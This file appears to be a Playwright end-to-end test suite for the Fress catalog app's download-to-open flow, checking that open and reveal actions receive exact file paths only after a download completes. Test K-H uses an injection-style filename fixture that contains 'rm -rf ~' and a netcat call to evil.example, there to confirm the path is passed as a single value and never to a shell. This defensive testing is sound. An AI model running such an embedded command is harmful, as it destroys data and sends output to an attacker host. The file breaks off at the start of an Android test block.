// Fress - a catalog of free and open-source software.
// Copyright (c) 2026 WasewaseX and Fress contributors
// SPDX-License-Identifier: MIT
//
/**
 * Workflow K - the download-to-open user journey (Tauri bridge mode).
 *
 * Proves the COMPLETE user journey end to end: pick a real catalog card,
 * download the artifact the resolver picked, watch the panel reach a
 * truthful completion state, and only then hand the EXACT completed file
 * to the native opener boundary. The native boundary (plugin:opener) and
 * the download engine are mocked by tests/e2e/tauri-bridge.ts; everything
 * between them - the real frontend - is the system under test.
 *
 * The binding contract asserted here (docs/download-lifecycle.md + the
 * DownloadManager implementation):
 *   - Open ("Open file") exists ONLY on a completed row with a non-empty
 *     path, and calls plugin:opener|open_path with { path: <exact value>,
 *     with: null } - the OS default app, never a shell string.
 *   - Show in folder ("Show in folder") calls plugin:opener|reveal_item_in_dir
 *     with { paths: [<exact completed file>] }, and degrades to opening the
 *     CONTAINING folder when the reveal is refused, then to an honest error.
 *   - No queued/active/verifying/retrying/failed/cancelled row exposes any
 *     open-shaped action, and no opener traffic exists before completion.
 *   - Every action is wired to ITS OWN download's completion payload - the
 *     path is never keyed by current selection, filename or last event.
 *
 * DEFECT PINS (routed to the production owner; NOT fixed in this suite):
 *   - K-G1: repeated activation of Open while one native launch is pending
 *     fires one open_path invocation per click - there is no pending-
 *     operation guard. Pinned with test.fail() asserting the correct
 *     contract; unpin when the fix lands.
 *
 * HONEST SCOPE: everything here runs against a mocked native boundary in a
 * desktop Chromium. It is UI-level evidence only. It does NOT prove that a
 * real Windows/macOS/Linux/Android system opens these artifacts - that is
 * docs/testing/download-open-smoke.md's manual matrix, marked NOT RUN where
 * no device is available.
 */
import { expect, test, bridge } from './fixtures';
import { sel, openDownloads } from './selectors';
import { DICTS } from '../../src/lib/i18n';
import type { Locator, Page } from '@playwright/test';

test.use({ tauriMode: true });

const d = DICTS.en;

/* ------------------------------------------------------------------ */
/* Fixture constants                                                   */
/* ------------------------------------------------------------------ */

/** The exact path the mock engine reports for the LocalSend fixture. */
const PATH_LOCALSEND = '/home/test/Downloads/LocalSend-1.17.0-windows-x64.exe';
const PATH_VLC = '/home/test/Downloads/vlc-3.0.21-win64.exe';
/** Deterministic fixture digests (the UI renders what the engine sent). */
const SHA_A = 'a'.repeat(64);
const SHA_B = 'b'.repeat(64);
const SHA_C = 'c'.repeat(64);
const SHA_D = 'd'.repeat(64);
/** A realistic Android app-private destination (used by the Android suite). */
const PATH_ANDROID_APK = '/data/data/app.fress.test/files/Downloads/localsend-1.17.0-universal.apk';

const ANDROID_UA =
  'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36';

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

/** Lets the toast queue drain: toasts float top-right and would intercept
 * clicks on the panel and the header (established Workflow D convention). */
async function drainToasts(page: Page): Promise<void> {
  await expect
    .poll(async () => page.locator('[data-sonner-toast]').count(), { timeout: 15_000 })
    .toBe(0);
}

/** Ids the engine registered (queued entries never register). */
async function registeredDownloadIds(page: Page): Promise<number[]> {
  const b = (await bridge(page))!;
  return Object.keys(b.downloads).map(Number);
}

/** The id whose registered URL contains `fragment`. */
async function downloadIdByUrl(page: Page, fragment: string): Promise<number> {
  const b = (await bridge(page))!;
  const hit = Object.values(b.downloads).find((dl) => dl.url.includes(fragment));
  if (!hit) throw new Error(`no registered download for ${fragment}`);
  return hit.id;
}

/** One snapshot of everything the frontend handed to the opener boundary. */
async function openerTraffic(page: Page): Promise<{
  open: Array<{ path: string; with: string | null }>;
  reveal: Array<{ paths: string[] }>;
}> {
  return page.evaluate(() => ({
    open: window.__fressTest!.openedPaths,
    reveal: window.__fressTest!.revealedPaths,
  }));
}

/** Delivers a download-complete event for `id` with an exact payload. */
async function complete(
  page: Page,
  id: number,
  path: string,
  bytes: number,
  sha256: string,
  verified?: boolean
): Promise<void> {
  await page.evaluate(
    ({ id, path, bytes, sha256, verified }) => {
      window.__fressTest!.emitComplete(id, path, bytes, sha256, verified);
    },
    { id, path, bytes, sha256, verified }
  );
}

/** Replaces the localsend release fixture with a single-asset release, so
 * the resolver's primary button offers exactly the artifact class under
 * test. Must run BEFORE the detail modal opens (it resolves on open). */
async function seedSingleAssetRelease(page: Page, assetName: string): Promise<void> {
  await page.evaluate((name) => {
    window.__fressTest!.setRelease('localsend/localsend', [
      {
        tag: 'v1.17.0',
        name: 'LocalSend 1.17.0',
        published_at: '2025-10-01T00:00:00Z',
        html_url: 'https://github.com/localsend/localsend/releases/tag/v1.17.0',
        assets: [
          {
            name,
            size: 12_345_678,
            download_url: 'https://github.com/localsend/localsend/releases/download/v1.17.0/' + name,
          },
        ],
      },
    ]);
  }, assetName);
}

/** Starts a transfer from the detail modal on an explicit platform tab.
 * `asset` is matched against the resolved primary button's accessible name. */
async function startFromDetail(
  page: Page,
  appId: string,
  platformTab: string,
  asset: RegExp
): Promise<void> {
  await page.locator(`#app-title-${appId}`).click();
  const box = page.locator(sel.detailDownloadBox);
  await expect(box).toBeVisible();
  await box.getByRole('button', { name: platformTab, exact: true }).click();
  const primary = box.getByRole('button', { name: asset });
  await expect(primary).toBeVisible({ timeout: 15_000 });
  await primary.click();
  await page.keyboard.press('Escape');
  await expect(box).toHaveCount(0);
  await drainToasts(page);
}

function openButton(row: Locator): Locator {
  return row.getByRole('button', { name: d['downloads.openFile'] });
}

function showButton(row: Locator): Locator {
  return row.getByRole('button', { name: d['downloads.showFolder'] });
}

function completedRow(page: Page, sha: string): Locator {
  return page.locator(sel.downloadRow('completed')).filter({ hasText: sha });
}

/** Collects uncaught page errors (including unhandled promise rejections,
 * which Chromium reports as pageerror) from this point on. */
function collectPageErrors(page: Page): string[] {
  const errors: string[] = [];
  page.on('pageerror', (e) => errors.push(String((e as Error)?.message ?? e)));
  return errors;
}

/** Walks keyboard focus (Tab) until `target` is the active element.
 * Returns false if the element is unreachable within `maxStops` - an
 * honest keyboard-availability answer, never a forceful programmatic
 * .focus() shortcut that would fake reachability. */
async function focusViaKeyboard(page: Page, target: Locator, maxStops = 80): Promise<boolean> {
  for (let i = 0; i <= maxStops; i++) {
    const isTarget = await target.evaluate((el) => el === document.activeElement);
    if (isTarget) return true;
    await page.keyboard.press('Tab');
  }
  return false;
}

const escapeRegExp = (s: string): string => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

/* ------------------------------------------------------------------ */
/* Workflow K                                                          */
/* ------------------------------------------------------------------ */

test.describe('Workflow K: the download-to-open journey', () => {
  test('K-A - the completed file opens: Open exists only after completion and hands the exact path to the opener', async ({ gotoApp, page }) => {
    await gotoApp();
    const pageErrors = collectPageErrors(page);
    await startFromDetail(page, 'localsend', 'Windows', /LocalSend-1\.17\.0-windows-x64\.exe/);
    await openDownloads(page);
    const [id] = await registeredDownloadIds(page);
    const row = page.locator(sel.downloadRow('active')).first();

    // Before completion: no open-shaped action exists in the row at all.
    await expect(openButton(row)).toHaveCount(0);
    await expect(showButton(row)).toHaveCount(0);
    await expect(page.locator(sel.downloadRow('completed'))).toHaveCount(0);

    // The native download lifecycle, driven deterministically.
    await page.evaluate((did) => window.__fressTest!.emitProgress(did, 8_388_608, 25_165_824, 4_194_304, 3), id);
    await expect(row.getByRole('progressbar')).toHaveAttribute('aria-valuenow', '33');
    await expect(openButton(row)).toHaveCount(0);

    // Verifying window: every byte is on disk, the commit decision is
    // pending - the UI must still not offer Open (Workflow D pins this
    // state; here it gates the open action).
    await page.evaluate((did) => window.__fressTest!.emitProgress(did, 25_165_824, 25_165_824, 0, 0), id);
    await expect(page.locator(sel.downloadRow('active'))).toHaveCount(1);
    await expect(openButton(row)).toHaveCount(0);

    // Completion payload with a known id, exact destination path, byte
    // count, digest and the fixture-appropriate verification state
    // (localsend has no trusted reference -> verified absent).
    await complete(page, id, PATH_LOCALSEND, 25_165_824, SHA_A);
    const done = page.locator(sel.downloadRow('completed')).first();
    await expect(done).toContainText(d['downloads.completedUnverified']);
    await expect(done).toContainText('SHA-256');

    // NOW Open becomes available.
    await expect(openButton(done)).toBeVisible();
    await expect(showButton(done)).toBeVisible();

    // Hold the native call in flight: no failure feedback may fire while
    // the OS handoff is pending.
    await page.evaluate(() => window.__fressTest!.setHoldOpenPath(true));
    await openButton(done).click();
    await expect
      .poll(async () => (await openerTraffic(page)).open.length)
      .toBe(1);
    await expect(page.locator('[data-sonner-toast]')).toHaveCount(0);

    // Resolve the native call: still no failure toast - success is the
    // absence of an error report, and the rejection path (K-F) is what
    // proves the toast is wired to failure only.
    await page.evaluate(() => window.__fressTest!.releaseOpenPath());
    await drainToasts(page);
    await expect(page.getByText(d['downloads.toast.openFileFailed'])).toHaveCount(0);

    // The opener received the EXACT completed path as a plain value with
    // the intended operation: OS default handler, no override, no shell.
    const open = (await openerTraffic(page)).open;
    expect(open).toHaveLength(1);
    expect(open[0].path).toBe(PATH_LOCALSEND);
    expect(open[0].with).toBeNull();
    expect(pageErrors).toEqual([]);
  });

  test('K-B - Show in folder reveals the exact completed file and degrades honestly when refused', async ({ gotoApp, page }) => {
    await gotoApp();
    const pageErrors = collectPageErrors(page);
    await startFromDetail(page, 'localsend', 'Windows', /LocalSend-1\.17\.0-windows-x64\.exe/);
    await openDownloads(page);
    const [id] = await registeredDownloadIds(page);
    await complete(page, id, PATH_LOCALSEND, 25_165_824, SHA_A);
    await drainToasts(page);
    const done = page.locator(sel.downloadRow('completed')).first();

    // The reveal call receives the FILE produced by THIS download - the
    // exact path, not its directory, not a hard-coded folder, not another
    // download's file.
    await showButton(done).click();
    const reveal = (await openerTraffic(page)).reveal;
    expect(reveal).toHaveLength(1);
    expect(reveal[0].paths).toEqual([PATH_LOCALSEND]);

    // Reveal refused (e.g. Windows builds without the explorer
    // integration): the fallback opens the file's CONTAINING folder -
    // never the file itself.
    await page.evaluate(() => window.__fressTest!.setFailReveal('no explorer integration'));
    await showButton(done).click();
    const open = (await openerTraffic(page)).open;
    expect(open).toHaveLength(1);
    expect(open[0].path).toBe('/home/test/Downloads');
    expect(open[0].with).toBeNull();

    // And when even the folder cannot be opened: an honest, localized error.
    await page.evaluate(() => window.__fressTest!.setFailOpenPath('Access is denied'));
    await showButton(done).click();
    await expect(page.getByText(d['downloads.toast.openFolderFailed'])).toBeVisible();
    expect(pageErrors).toEqual([]);
  });

  test('K-C - nothing can request an open while a download is queued, active, verifying or retrying', async ({ gotoApp, page }) => {
    await gotoApp();
    await startFromDetail(page, 'localsend', 'Windows', /LocalSend-1\.17\.0-windows-x64\.exe/);
    await startFromDetail(page, 'vlc', 'Windows', /vlc-3\.0\.21-win64\.exe/);
    await startFromDetail(page, 'obsidian', 'Windows', /Obsidian-1\.10\.0\.exe/);
    // The fourth transfer waits in the FIFO queue (three slots).
    await startFromDetail(page, 'sharex', 'Windows', /ShareX-17\.1\.0-setup\.exe/);
    await openDownloads(page);
    await expect(page.locator(sel.downloadRow('active'))).toHaveCount(3);
    await expect(page.locator(sel.downloadRow('queued'))).toHaveCount(1);

    const panel = page.locator(sel.downloadsPanel);
    // A hidden action must also not be a focusable/activatable one: the
    // rows expose ONLY their documented action (Cancel). Anything absent
    // from the DOM cannot be tabbed to or pressed.
    for (const status of ['active', 'queued'] as const) {
      const rows = page.locator(sel.downloadRow(status));
      const count = await rows.count();
      for (let i = 0; i < count; i++) {
        await expect(rows.nth(i).getByRole('button')).toHaveCount(1);
        await expect(rows.nth(i).getByRole('button')).toHaveAccessibleName(d['downloads.cancel']);
      }
    }
    await expect(panel.getByRole('button', { name: d['downloads.openFile'] })).toHaveCount(0);
    await expect(panel.getByRole('button', { name: d['downloads.showFolder'] })).toHaveCount(0);

    const ids = await registeredDownloadIds(page);

    // Verifying window on the first transfer: still not openable.
    await page.evaluate((did) => window.__fressTest!.emitProgress(did, 25_165_824, 25_165_824, 0, 0), ids[0]);
    await expect(page.locator(sel.downloadRow('completed'))).toHaveCount(0);
    await expect(panel.getByRole('button', { name: d['downloads.openFile'] })).toHaveCount(0);

    // An automatic retry keeps the row active (never completed): still no
    // open action anywhere in the panel.
    await page.evaluate((did) => window.__fressTest!.emitRetrying(did, 1, 'connection reset'), ids[1]);
    await expect(page.locator(sel.downloadRow('active'))).toHaveCount(3);
    await expect(panel.getByRole('button', { name: d['downloads.openFile'] })).toHaveCount(0);

    // No native handler was ever invoked.
    const traffic = await openerTraffic(page);
    expect(traffic.open).toHaveLength(0);
    expect(traffic.reveal).toHaveLength(0);

    // Positive control: the panel CAN grow an Open button the moment a
    // completion is real - the absence above is protection, not blindness.
    await complete(page, ids[0], PATH_LOCALSEND, 25_165_824, SHA_A);
    await expect(page.locator(sel.downloadRow('completed'))).toHaveCount(1);
    await expect(panel.getByRole('button', { name: d['downloads.openFile'] })).toHaveCount(1);
  });

  test('K-D1 - network failure, user cancellation and checksum mismatch never offer an open action', async ({ gotoApp, page }) => {
    await gotoApp();
    const pageErrors = collectPageErrors(page);
    await startFromDetail(page, 'localsend', 'Windows', /LocalSend-1\.17\.0-windows-x64\.exe/);
    await startFromDetail(page, 'vlc', 'Windows', /vlc-3\.0\.21-win64\.exe/);
    // Signal's OFFICIAL resolver carries a trusted digest (the fixture) -
    // the one path where a checksum mismatch can genuinely occur.
    await startFromDetail(page, 'signal', 'Windows', /signal-desktop-win-x64-7\.20\.0\.exe/);
    await openDownloads(page);
    const panel = page.locator(sel.downloadsPanel);
    const localsendId = await downloadIdByUrl(page, 'localsend');
    const vlcId = await downloadIdByUrl(page, 'vlc');
    const signalId = await downloadIdByUrl(page, 'signal');

    // Network failure: resumable, but nothing runnable exists.
    await page.evaluate((did) => window.__fressTest!.emitProgress(did, 5_242_880, 25_165_824, 2_097_152, 10), localsendId);
    await page.evaluate((did) => window.__fressTest!.emitError(did, 'Network error: connection lost', 'network'), localsendId);
    const netRow = page.locator(sel.downloadRow('error')).filter({ hasText: 'LocalSend-1.17.0' });
    await expect(netRow).toContainText(d['downloads.failed']);
    await expect(netRow.getByRole('button', { name: d['downloads.resume'] })).toBeVisible();
    await expect(netRow.getByRole('button', { name: d['downloads.openFile'] })).toHaveCount(0);
    await expect(netRow.getByRole('button', { name: d['downloads.showFolder'] })).toHaveCount(0);

    // User cancellation: same protection.
    await page
      .locator(sel.downloadRow('active'))
      .filter({ hasText: 'vlc-3.0.21-win64.exe' })
      .getByRole('button', { name: d['downloads.cancel'] })
      .click();
    const cancelled = page.locator(sel.downloadRow('cancelled')).first();
    await expect(cancelled).toContainText(d['downloads.cancelled']);
    await expect(cancelled.getByRole('button', { name: d['downloads.openFile'] })).toHaveCount(0);
    await expect(cancelled.getByRole('button', { name: d['downloads.showFolder'] })).toHaveCount(0);
    await expect(cancelled.getByRole('button', { name: d['downloads.resume'] })).toBeVisible();

    // Checksum mismatch: the artifact was deleted on disk; nothing may be
    // advertised as runnable - and no hash row may survive to imply a
    // verifiable file exists.
    expect((await bridge(page))!.downloads[signalId].expectedSha512).toBeTruthy();
    await page.evaluate((did) => window.__fressTest!.emitProgress(did, 178_257_920, 178_257_920, 0, 0), signalId);
    await page.evaluate(
      (did) => window.__fressTest!.emitError(did, 'SHA-512 mismatch: artifact is corrupt and was deleted', 'checksum'),
      signalId
    );
    const corruptRow = page.locator(sel.downloadRow('error')).filter({ hasText: 'signal-desktop-win-x64' });
    await expect(corruptRow).toContainText('SHA-512 mismatch');
    await expect(corruptRow.getByRole('button', { name: d['downloads.openFile'] })).toHaveCount(0);
    await expect(corruptRow.getByRole('button', { name: d['downloads.showFolder'] })).toHaveCount(0);
    await expect(corruptRow.getByRole('button', { name: /SHA-256/ })).toHaveCount(0);
    await expect(corruptRow.getByRole('button', { name: d['downloads.retry'] })).toBeVisible();

    // Across every failure case: zero opener traffic.
    const traffic = await openerTraffic(page);
    expect(traffic.open).toHaveLength(0);
    expect(traffic.reveal).toHaveLength(0);
    expect(pageErrors).toEqual([]);
  });

  test('K-D2 - unusable completions (file gone at open time, empty path) never fake a runnable artifact', async ({ gotoApp, page }) => {
    await gotoApp();
    const pageErrors = collectPageErrors(page);
    await startFromDetail(page, 'localsend', 'Windows', /LocalSend-1\.17\.0-windows-x64\.exe/);
    await startFromDetail(page, 'obsidian', 'Windows', /Obsidian-1\.10\.0\.exe/);
    await openDownloads(page);
    const localsendId = await downloadIdByUrl(page, 'localsend');
    const obsidianId = await downloadIdByUrl(page, 'obsidian');

    // The file existed at completion and disappeared afterwards (cleanup,
    // antivirus, user action): the OS reports it at open time and the UI
    // must surface that failure instead of pretending success.
    await complete(page, localsendId, PATH_LOCALSEND, 25_165_824, SHA_A);
    await drainToasts(page);
    const done = completedRow(page, SHA_A);
    await page.evaluate(() => window.__fressTest!.setFailOpenPath('No such file or directory'));
    await openButton(done).click();
    await expect(page.getByText(d['downloads.toast.openFileFailed'])).toBeVisible();
    // The row stays honestly completed - the failure is the open action's,
    // not a fake state flip.
    await expect(done).toContainText(d['downloads.completedUnverified']);

    // The engine reporting completion with an EMPTY path: no destination is
    // known, so nothing may be openable.
    await complete(page, obsidianId, '', 900_000, SHA_B);
    const emptyRow = page.locator(sel.downloadRow('completed')).filter({ hasText: 'Obsidian-1.10.0.exe' });
    await expect(emptyRow).toHaveCount(1);
    await expect(emptyRow.getByRole('button', { name: d['downloads.openFile'] })).toHaveCount(0);
    await expect(emptyRow.getByRole('button', { name: d['downloads.showFolder'] })).toHaveCount(0);

    const traffic = await openerTraffic(page);
    expect(traffic.open).toHaveLength(1); // only the deliberate gone-file probe
    expect(traffic.open[0].path).toBe(PATH_LOCALSEND);
    expect(traffic.reveal).toHaveLength(0);
    expect(pageErrors).toEqual([]);
  });

  test('K-E1 - out-of-order concurrent completions keep every action wired to its own file', async ({ gotoApp, page }) => {
    await gotoApp();
    const pageErrors = collectPageErrors(page);
    await startFromDetail(page, 'localsend', 'Windows', /LocalSend-1\.17\.0-windows-x64\.exe/);
    await startFromDetail(page, 'vlc', 'Windows', /vlc-3\.0\.21-win64\.exe/);
    await openDownloads(page);
    const localsendId = await downloadIdByUrl(page, 'localsend');
    const vlcId = await downloadIdByUrl(page, 'vlc');

    // Interleaved progress, then B finishes BEFORE A.
    await page.evaluate((did) => window.__fressTest!.emitProgress(did, 5_242_880, 25_165_824, 2_097_152, 10), localsendId);
    await page.evaluate((did) => window.__fressTest!.emitProgress(did, 12_582_912, 41_000_000, 4_194_304, 7), vlcId);
    await complete(page, vlcId, PATH_VLC, 41_000_000, SHA_B);
    await page.evaluate((did) => window.__fressTest!.emitProgress(did, 20_971_520, 25_165_824, 2_097_152, 2), localsendId);
    await complete(page, localsendId, PATH_LOCALSEND, 25_165_824, SHA_A);
    await drainToasts(page);

    const rowA = completedRow(page, SHA_A);
    const rowB = completedRow(page, SHA_B);
    await expect(rowA).toHaveCount(1);
    await expect(rowB).toHaveCount(1);

    // A state keyed by "last completion event" or "current selection"
    // would open VLC's file for the LocalSend row. The exact-path asserts
    // below are the cross-wiring detector.
    await openButton(rowA).click();
    await openButton(rowB).click();
    const open = (await openerTraffic(page)).open;
    expect(open).toHaveLength(2);
    expect(open[0].path).toBe(PATH_LOCALSEND);
    expect(open[1].path).toBe(PATH_VLC);

    // Reveal is per-row too.
    await showButton(rowA).click();
    const reveal = (await openerTraffic(page)).reveal;
    expect(reveal).toHaveLength(1);
    expect(reveal[0].paths).toEqual([PATH_LOCALSEND]);
    expect(pageErrors).toEqual([]);
  });

  test('K-E2 - duplicate filenames with collision-safe destinations stay wired per row; duplicate events create no duplicate UI state', async ({ gotoApp, page }) => {
    await gotoApp();
    const pageErrors = collectPageErrors(page);
    await startFromDetail(page, 'localsend', 'Windows', /LocalSend-1\.17\.0-windows-x64\.exe/);
    await startFromDetail(page, 'localsend', 'Windows', /LocalSend-1\.17\.0-windows-x64\.exe/);
    await openDownloads(page);
    const firstId = await downloadIdByUrl(page, 'localsend');
    const ids = await registeredDownloadIds(page);
    const secondId = ids.find((n) => n !== firstId)!;

    // The engine's no-clobber commit picks collision-safe destinations.
    const firstPath = '/home/test/Downloads/LocalSend-1.17.0-windows-x64.exe';
    const secondPath = '/home/test/Downloads/LocalSend-1.17.0-windows-x64 (1).exe';
    await complete(page, firstId, firstPath, 25_165_824, SHA_A);
    await complete(page, secondId, secondPath, 25_165_824, SHA_B);
    await drainToasts(page);

    // Same visible filename twice - the rows are told apart by their
    // digest row (rendered from each item's own payload).
    const row1 = completedRow(page, SHA_A);
    const row2 = completedRow(page, SHA_B);
    await expect(row1).toHaveCount(1);
    await expect(row2).toHaveCount(1);

    await openButton(row1).click();
    await openButton(row2).click();
    const open = (await openerTraffic(page)).open;
    expect(open).toHaveLength(2);
    expect(open[0].path).toBe(firstPath);
    expect(open[1].path).toBe(secondPath);

    // Listener-hygiene contract: a duplicate completion event for an
    // already-completed download must NOT create duplicate UI state.
    await complete(page, firstId, firstPath, 25_165_824, SHA_A);
    await expect(page.locator(sel.downloadRow('completed'))).toHaveCount(2);
    expect((await openerTraffic(page)).open).toHaveLength(2);
    expect(pageErrors).toEqual([]);
  });

  test('K-F - open rejection: surfaced to the user, never stuck busy, retryable, no unhandled rejection', async ({ gotoApp, page }) => {
    await gotoApp();
    const pageErrors = collectPageErrors(page);
    await startFromDetail(page, 'localsend', 'Windows', /LocalSend-1\.17\.0-windows-x64\.exe/);
    await openDownloads(page);
    const [id] = await registeredDownloadIds(page);
    await complete(page, id, PATH_LOCALSEND, 25_165_824, SHA_A);
    await drainToasts(page);
    const done = completedRow(page, SHA_A);

    // The OS refuses (permission denied / no default handler): the user
    // gets an understandable error.
    await page.evaluate(() => window.__fressTest!.setFailOpenPath('Permission denied'));
    await openButton(done).click();
    await expect(page.getByText(d['downloads.toast.openFileFailed'])).toBeVisible();

    // The action does not remain busy or disabled: an immediate retry is
    // possible and really reaches the boundary again.
    await drainToasts(page);
    await openButton(done).click();
    await expect
      .poll(async () => (await openerTraffic(page)).open.length)
      .toBe(2);

    // Once the OS-side problem is gone the same action succeeds.
    await page.evaluate(() => window.__fressTest!.setFailOpenPath(null));
    await openButton(done).click();
    await expect
      .poll(async () => (await openerTraffic(page)).open.length)
      .toBe(3);
    await drainToasts(page);
    await expect(page.getByText(d['downloads.toast.openFileFailed'])).toHaveCount(0);

    // The rejected invokes were handled promises: nothing reached the
    // console as an unhandled rejection.
    expect(pageErrors).toEqual([]);
  });

  test.fail('K-G1 [pinned defect] - repeated activation while one open is pending must not stack native launches', async ({ gotoApp, page }) => {
    await gotoApp();
    await startFromDetail(page, 'localsend', 'Windows', /LocalSend-1\.17\.0-windows-x64\.exe/);
    await openDownloads(page);
    const [id] = await registeredDownloadIds(page);
    await complete(page, id, PATH_LOCALSEND, 25_165_824, SHA_A);
    await drainToasts(page);
    const done = completedRow(page, SHA_A);

    // One launch is pending (the OS handoff has not returned yet)...
    await page.evaluate(() => window.__fressTest!.setHoldOpenPath(true));
    await openButton(done).click();
    // ...and the user (or a double-fire) activates twice more while it is.
    await openButton(done).click();
    await openButton(done).click();

    // CORRECT contract: exactly one native launch may be in flight for
    // that action while it is pending. The current implementation has no
    // pending-operation guard, so this reads 3 - the test is PINNED with
    // test.fail() (repo convention for defects owned by production).
    // Minimal repro: complete a download, hold open_path in the bridge,
    // click "Open file" three times, count plugin:opener|open_path calls.
    // Owner: production frontend (src/lib/downloads.tsx openFile /
    // DownloadManager PanelButton). Unpin this test when the fix lands.
    const pending = (await openerTraffic(page)).open.length;
    await page.evaluate(() => window.__fressTest!.releaseOpenPath());
    expect(pending).toBe(1);
  });

  test('K-G2 - keyboard activation, visible focus and truthful accessible names on the open actions', async ({ gotoApp, page }) => {
    await gotoApp();
    await startFromDetail(page, 'localsend', 'Windows', /LocalSend-1\.17\.0-windows-x64\.exe/);
    await openDownloads(page);
    const [id] = await registeredDownloadIds(page);
    await complete(page, id, PATH_LOCALSEND, 25_165_824, SHA_A);
    await drainToasts(page);
    const done = completedRow(page, SHA_A);
    const open = openButton(done);
    const show = showButton(done);

    // Reachable by keyboard: Tab walks real focus onto the action.
    const reached = await focusViaKeyboard(page, open);
    expect(reached, 'the Open action must be reachable with Tab alone').toBe(true);
    await expect(open).toBeFocused();

    // Visible focus: a focus indicator is painted (UA ring or the design
    // system's own ring/shadow).
    const indicator = await page.evaluate(() => {
      const el = document.activeElement as HTMLElement | null;
      if (!el) return { outline: '', shadow: '' };
      const cs = getComputedStyle(el);
      return { outline: cs.outlineStyle, shadow: cs.boxShadow };
    });
    expect(
      indicator.outline === 'auto' ||
        (indicator.outline !== 'none' && indicator.outline !== '') ||
        indicator.shadow !== 'none',
      `the focused action must paint a visible focus indicator (got outline=${indicator.outline}, shadow=${indicator.shadow})`
    ).toBe(true);

    // Enter activates the real handler exactly once per activation.
    let before = (await openerTraffic(page)).open.length;
    await page.keyboard.press('Enter');
    await expect.poll(async () => (await openerTraffic(page)).open.length).toBe(before + 1);

    // Space activates too (native button semantics), and the button is
    // still focused afterwards - activation never drops keyboard position.
    await expect(open).toBeFocused();
    before = (await openerTraffic(page)).open.length;
    await page.keyboard.press('Space');
    await expect.poll(async () => (await openerTraffic(page)).open.length).toBe(before + 1);

    // Truthful names by construction: the locators above resolved BY the
    // accessible names "Open file" / "Show in folder"; assert the sibling
    // action resolves the same way, and that nothing reports a disabled
    // state for an action that genuinely works.
    await expect(show).toBeVisible();
    await expect(open).toBeEnabled();
    expect(await open.getAttribute('disabled')).toBeNull();
    expect(await open.getAttribute('aria-disabled')).toBeNull();
  });

  test('K-H - spaces, Unicode, parentheses and shell-like filenames pass through the boundary as values', async ({ gotoApp, page }) => {
    await gotoApp();
    const pageErrors = collectPageErrors(page);
    await startFromDetail(page, 'localsend', 'Windows', /LocalSend-1\.17\.0-windows-x64\.exe/);
    await startFromDetail(page, 'vlc', 'Windows', /vlc-3\.0\.21-win64\.exe/);
    await openDownloads(page);
    const localsendId = await downloadIdByUrl(page, 'localsend');
    const vlcId = await downloadIdByUrl(page, 'vlc');

    // A path whose basename differs from the item name proves the value
    // comes from the completion payload, not from the row's filename;
    // spaces, Unicode, parentheses and brackets exercise naive splitting.
    const spaced = '/home/test/Downloads/Lokaler Versand 1.17 (offiziell) — Änderungen [x64] & final.exe';
    // A filename that resembles shell fragments must arrive as ONE value;
    // tokenization or interpolation would show up as extra invokes or
    // mangled arguments.
    const shelly = '/home/test/Downloads/fix;rm -rf ~;$(id) `whoami` | nc evil.example 80 && echo owned.exe';

    await complete(page, localsendId, spaced, 25_165_824, SHA_A);
    await complete(page, vlcId, shelly, 41_000_000, SHA_B);
    await drainToasts(page);

    const rowA = completedRow(page, SHA_A);
    const rowB = completedRow(page, SHA_B);
    await openButton(rowA).click();
    await openButton(rowB).click();
    const open = (await openerTraffic(page)).open;
    expect(open).toHaveLength(2);
    expect(open[0].path).toBe(spaced);
    expect(open[1].path).toBe(shelly);
    expect(open[0].with).toBeNull();
    expect(open[1].with).toBeNull();

    // Reveal passes the same fidelity through the paths array.
    await showButton(rowA).click();
    const reveal = (await openerTraffic(page)).reveal;
    expect(reveal).toHaveLength(1);
    expect(reveal[0].paths).toEqual([spaced]);
    expect(pageErrors).toEqual([]);
  });

  /* ---------------------------------------------------------------- */
  /* K-I - one intended action per artifact class                       */
  /* ---------------------------------------------------------------- */
  /* For every file class the resolver can hand a user, the frontend must
   * pass the completed path to the native adapter as a value with the
   * default-handler operation. This stays at the frontend/adapter
   * boundary BY DESIGN: a mocked open_path resolving proves the REQUEST,
   * never that a real Windows installer, macOS disk image, Linux package
   * or Android APK actually launched - that is the manual smoke matrix. */

  const ARTIFACT_CLASSES: Array<{ key: string; platformTab: string; asset: string }> = [
    { key: 'windows exe installer', platformTab: 'Windows', asset: 'FixtureApp-1.0.0-x64-setup.exe' },
    { key: 'windows msi package', platformTab: 'Windows', asset: 'fixtureapp-1.0.0-x64.msi' },
    { key: 'windows portable zip', platformTab: 'Windows', asset: 'FixtureApp-1.0.0-x64-portable.zip' },
    { key: 'macos dmg', platformTab: 'macOS', asset: 'FixtureApp-1.0.0-x64.dmg' },
    { key: 'macos pkg', platformTab: 'macOS', asset: 'FixtureApp-1.0.0-x64.pkg' },
    { key: 'linux deb', platformTab: 'Linux', asset: 'fixtureapp_1.0.0_amd64.deb' },
    { key: 'linux rpm', platformTab: 'Linux', asset: 'fixtureapp-1.0.0.x86_64.rpm' },
    { key: 'linux appimage', platformTab: 'Linux', asset: 'FixtureApp-1.0.0-x86_64.AppImage' },
    { key: 'android apk', platformTab: 'Android', asset: 'fixtureapp-1.0.0-universal.apk' },
  ];

  for (const c of ARTIFACT_CLASSES) {
    test(`K-I ${c.key} - the completed ${c.asset} is handed to the opener as the exact value`, async ({ gotoApp, page }) => {
      await gotoApp();
      await seedSingleAssetRelease(page, c.asset);
      await startFromDetail(page, 'localsend', c.platformTab, new RegExp(escapeRegExp(c.asset)));
      await openDownloads(page);
      const id = await downloadIdByUrl(page, c.asset);
      const destination = `/home/test/Downloads/${c.asset}`;
      await complete(page, id, destination, 12_345_678, SHA_C);
      await drainToasts(page);

      const done = page.locator(sel.downloadRow('completed')).first();
      await expect(done).toContainText(c.asset);
      await openButton(done).click();
      const open = (await openerTraffic(page)).open;
      expect(open).toHaveLength(1);
      expect(open[0].path).toBe(destination);
      expect(open[0].with).toBeNull();

      // On desktop, Show in folder is part of the same per-artifact
      // contract. Android omits it (app-private storage) - K-Android.
      if (c.platformTab !== 'Android') {
        await showButton(done).click();
        const reveal = (await openerTraffic(page)).reveal;
        expect(reveal).toHaveLength(1);
        expect(reveal[0].paths).toEqual([destination]);
      }
    });
  }
});

/* ------------------------------------------------------------------ */
/* Android artifact-opening surface                                    */
/* ------------------------------------------------------------------ */

test.describe('Workflow K: Android artifact surface', () => {
